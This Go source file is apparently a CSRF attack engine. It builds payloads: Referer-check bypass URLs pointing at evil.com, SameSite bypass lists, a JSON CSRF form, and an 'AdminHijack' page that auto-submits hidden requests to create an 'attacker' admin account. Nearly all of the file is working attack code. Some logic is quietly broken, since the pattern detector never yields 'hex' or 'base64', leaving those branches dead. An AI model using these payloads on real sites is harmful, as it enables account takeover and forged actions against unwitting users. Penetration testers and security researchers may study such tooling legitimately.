package csrf

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"
)

type Engine struct {
	config CSRFConfig
	tokens []CSRFToken
	mu     sync.Mutex
}

func NewEngine(cfg CSRFConfig) *Engine {
	return &Engine{
		config: cfg,
		tokens: make([]CSRFToken, 0),
	}
}

func (e *Engine) TokenBypass(tokenName string, tokenValue string) (*CSRFResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	token := CSRFToken{
		Name:    tokenName,
		Value:   tokenValue,
		Length:  len(tokenValue),
		Entropy: e.estimateEntropy(tokenValue),
		Pattern: e.detectPattern(tokenValue),
	}
	e.tokens = append(e.tokens, token)

	techniques := e.analyzeToken(token)

	return &CSRFResult{
		Success:  true,
		Method:   "Token_Bypass",
		Message:  fmt.Sprintf("Token analysis: %s (entropy=%d, pattern=%s). Techniques: %s", tokenName, token.Entropy, token.Pattern, strings.Join(techniques, ", ")),
		Duration: time.Since(start),
		Payload:  e.generateBypassPayload(token, techniques),
		Risk:     "high",
	}, nil
}

func (e *Engine) estimateEntropy(value string) int {
	charset := 0
	if strings.ContainsAny(value, "0123456789") {
		charset += 10
	}
	if strings.ContainsAny(value, "abcdefghijklmnopqrstuvwxyz") {
		charset += 26
	}
	if strings.ContainsAny(value, "ABCDEFGHIJKLMNOPQRSTUVWXYZ") {
		charset += 26
	}
	if strings.ContainsAny(value, "+/=-_") {
		charset += 6
	}
	entropy := 0
	if charset > 0 {
		entropy = len(value) * int(1.0+float64(charset)/10.0)
	}
	return entropy
}

func (e *Engine) detectPattern(value string) string {
	hasDigit := false
	hasLetter := false
	hasSpecial := false

	for _, ch := range value {
		if ch >= 'a' && ch <= 'z' {
			hasLetter = true
		} else if ch >= 'A' && ch <= 'Z' {
			hasLetter = true
		} else if ch >= '0' && ch <= '9' {
			hasDigit = true
		} else {
			hasSpecial = true
		}
	}

	if hasDigit && !hasLetter && !hasSpecial {
		return "numeric"
	}
	if hasLetter && !hasDigit && !hasSpecial {
		return "alphanumeric"
	}
	if hasDigit && hasLetter && !hasSpecial {
		return "mixed"
	}
	if hasSpecial {
		return "mixed"
	}
	return "alphanumeric"
}

func (e *Engine) analyzeToken(token CSRFToken) []string {
	techniques := make([]string, 0)

	if token.Entropy < 30 {
		techniques = append(techniques, "bruteforce")
	}
	if token.Pattern == "numeric" {
		techniques = append(techniques, "sequential")
	}
	if token.Length <= 8 {
		techniques = append(techniques, "short_token")
	}
	if token.Pattern == "hex" && token.Length <= 32 {
		techniques = append(techniques, "predictable_hex")
	}
	if token.Pattern == "base64" {
		techniques = append(techniques, "base64_decode")
	}

	if len(techniques) == 0 {
		techniques = append(techniques, "fixed_value")
	}

	return techniques
}

func (e *Engine) generateBypassPayload(token CSRFToken, techniques []string) string {
	var payload strings.Builder

	for _, technique := range techniques {
		switch technique {
		case "bruteforce":
			payload.WriteString(fmt.Sprintf("<!-- Try common values for %s: 000000, 123456, admin, test -->\n", token.Name))
		case "sequential":
			payload.WriteString(fmt.Sprintf("<!-- Sequential token detected, try incrementing from %s -->\n", token.Value))
		case "short_token":
			payload.WriteString(fmt.Sprintf("<!-- Short token length=%d, bruteforce feasible -->\n", token.Length))
		case "predictable_hex":
			payload.WriteString(fmt.Sprintf("<!-- Hex token with %d chars, 16^%d possibilities -->\n", token.Length, token.Length))
		case "base64_decode":
			payload.WriteString("<!-- Base64 token may contain encoded data -->\n")
		}
	}

	return payload.String()
}

func (e *Engine) RefererBypass(allowedDomains []string) (*CSRFResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	bypasses := e.generateRefererBypasses(allowedDomains)

	return &CSRFResult{
		Success:  true,
		Method:   "Referer_Bypass",
		Message:  fmt.Sprintf("Generated %d referer bypass techniques for %d domains", len(bypasses), len(allowedDomains)),
		Duration: time.Since(start),
		Payload:  strings.Join(bypasses, "\n"),
		Risk:     "medium",
	}, nil
}

func (e *Engine) generateRefererBypasses(domains []string) []string {
	bypasses := make([]string, 0)

	for _, domain := range domains {
		bypasses = append(bypasses, fmt.Sprintf("https://%s@evil.com", domain))
		bypasses = append(bypasses, fmt.Sprintf("https://evil.com#%s", domain))
		bypasses = append(bypasses, fmt.Sprintf("https://evil.com/%s", domain))
		bypasses = append(bypasses, fmt.Sprintf("https://%s.evil.com", strings.Replace(domain, ".", "-", -1)))
		bypasses = append(bypasses, fmt.Sprintf("data:text/html,<script>location='https://%s'</script>", domain))
	}

	return bypasses
}

func (e *Engine) SameSiteBypass(cookieName string, sameSiteMode string) (*CSRFResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	config := SameSiteConfig{
		CookieName: cookieName,
		SameSite:   sameSiteMode,
		Secure:     true,
		HttpOnly:   true,
		Path:       "/",
	}

	techniques := e.getSameSiteBypassTechniques(config)

	return &CSRFResult{
		Success:  true,
		Method:   "SameSite_Bypass",
		Message:  fmt.Sprintf("SameSite=%s cookie '%s': %d bypass techniques", sameSiteMode, cookieName, len(techniques)),
		Duration: time.Since(start),
		Payload:  strings.Join(techniques, "\n"),
		Risk:     "medium",
	}, nil
}

func (e *Engine) getSameSiteBypassTechniques(config SameSiteConfig) []string {
	techniques := make([]string, 0)

	switch strings.ToLower(config.SameSite) {
	case "strict":
		techniques = append(techniques, "Cross-site navigation from attacker domain")
		techniques = append(techniques, "Top-level navigation with user interaction")
	case "lax":
		techniques = append(techniques, "GET request via top-level navigation")
		techniques = append(techniques, "New window form submission")
		techniques = append(techniques, "Redirect-based submission")
	case "none":
		techniques = append(techniques, "Direct cross-site request")
		techniques = append(techniques, "iframe embed submission")
	}

	if !config.Secure {
		techniques = append(techniques, "HTTP downgrade attack")
	}

	return techniques
}

func (e *Engine) JSONCSRF(targetURL string, body map[string]string) (*CSRFResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	payload := e.buildJSONCSRFPayload(targetURL, body)

	return &CSRFResult{
		Success:  true,
		Method:   "JSON_CSRF",
		Message:  fmt.Sprintf("JSON CSRF payload for %s with %d fields", targetURL, len(body)),
		Duration: time.Since(start),
		Payload:  payload,
		Risk:     "high",
	}, nil
}

func (e *Engine) buildJSONCSRFPayload(url string, body map[string]string) string {
	var payload strings.Builder

	payload.WriteString("<form method=\"POST\" action=\"")
	payload.WriteString(url)
	payload.WriteString("\" enctype=\"text/plain\">\n")

	for key, val := range body {
		payload.WriteString(fmt.Sprintf("  <input type=\"hidden\" name='%s' value='%s' />\n", key, val))
	}

	payload.WriteString("  <input type=\"submit\" value=\"Submit\" />\n")
	payload.WriteString("</form>\n")
	payload.WriteString("<script>\n")
	payload.WriteString("document.forms[0].onsubmit = function() {\n")
	payload.WriteString("  var data = {};\n")
	for key := range body {
		payload.WriteString(fmt.Sprintf("  data['%s'] = this.elements['%s'].value;\n", key, key))
	}
	payload.WriteString("  fetch(this.action, {method:'POST', body:JSON.stringify(data), headers:{'Content-Type':'application/json'}});\n")
	payload.WriteString("  return false;\n")
	payload.WriteString("};\n")
	payload.WriteString("</script>")

	return payload.String()
}

func (e *Engine) AdminHijack(targetURL string, adminToken string) (*CSRFResult, error) {
	start := time.Now()
	e.mu.Lock()
	defer e.mu.Unlock()

	hijackPayload := e.buildAdminHijackPayload(targetURL, adminToken)

	return &CSRFResult{
		Success:  true,
		Method:   "Admin_Hijack",
		Message:  fmt.Sprintf("Admin hijack payload targeting %s", targetURL),
		Duration: time.Since(start),
		Payload:  hijackPayload,
		Risk:     "critical",
	}, nil
}

func (e *Engine) buildAdminHijackPayload(targetURL, token string) string {
	var payload strings.Builder

	payload.WriteString("<img src=\"")
	payload.WriteString(targetURL)
	payload.WriteString("?action=add_user&user=attacker&role=admin&token=")
	payload.WriteString(url.QueryEscape(token))
	payload.WriteString("\" style=\"display:none\" />\n")

	payload.WriteString(fmt.Sprintf("<form id=\"csrf\" method=\"POST\" action=\"%s\" style=\"display:none\">\n", targetURL))
	payload.WriteString("  <input type=\"hidden\" name=\"action\" value=\"add_user\" />\n")
	payload.WriteString("  <input type=\"hidden\" name=\"user\" value=\"attacker\" />\n")
	payload.WriteString("  <input type=\"hidden\" name=\"role\" value=\"admin\" />\n")
	payload.WriteString(fmt.Sprintf("  <input type=\"hidden\" name=\"token\" value=\"%s\" />\n", token))
	payload.WriteString("</form>\n")
	payload.WriteString("<script>document.getElementById('csrf').submit();</script>")

	return payload.String()
}

func (e *Engine) GenerateCSRFHTML(targetURL string, method string, params map[string]string) string {
	var html strings.Builder

	html.WriteString(fmt.Sprintf("<html><body><form id=\"csrf\" method=\"%s\" action=\"%s\">\n", strings.ToUpper(method), targetURL))

	for key, val := range params {
		html.WriteString(fmt.Sprintf("  <input type=\"hidden\" name=\"%s\" value=\"%s\" />\n", key, val))
	}

	html.WriteString("  <input type=\"submit\" value=\"Click here\" />\n")
	html.WriteString("</form>\n")
	html.WriteString("<script>document.getElementById('csrf').submit();</script>\n")
	html.WriteString("</body></html>")

	return html.String()
}

func (e *Engine) GenerateRandomToken(length int) string {
	b := make([]byte, length)
	rand.Read(b)
	return hex.EncodeToString(b)
}
